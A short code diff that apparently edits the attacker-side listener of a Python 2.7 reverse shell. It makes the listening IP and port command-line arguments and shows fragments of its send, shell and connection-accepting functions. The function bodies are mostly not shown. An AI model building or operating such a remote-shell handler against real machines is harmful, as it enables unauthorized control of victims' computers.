@@ -1,8 +1,9 @@
-#!/usr/bin/python
+#!/usr/bin/python2.7
 
 import socket 
 import base64
 import json
+import sys
 
 
 def reliable_send(data):
@@ -44,6 +45,7 @@ def shell():
 def server():
     global s
     global ip
+    global port
     global target
 
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -55,7 +57,8 @@ def server():
     target, ip = s.accept()
     print("[+] Connection Established From: %s" % str(ip))
 
-ip  = "127.0.0.1"
+ip = sys.argv[1]
+port = sys.argv[2]
 
 server()
 shell()
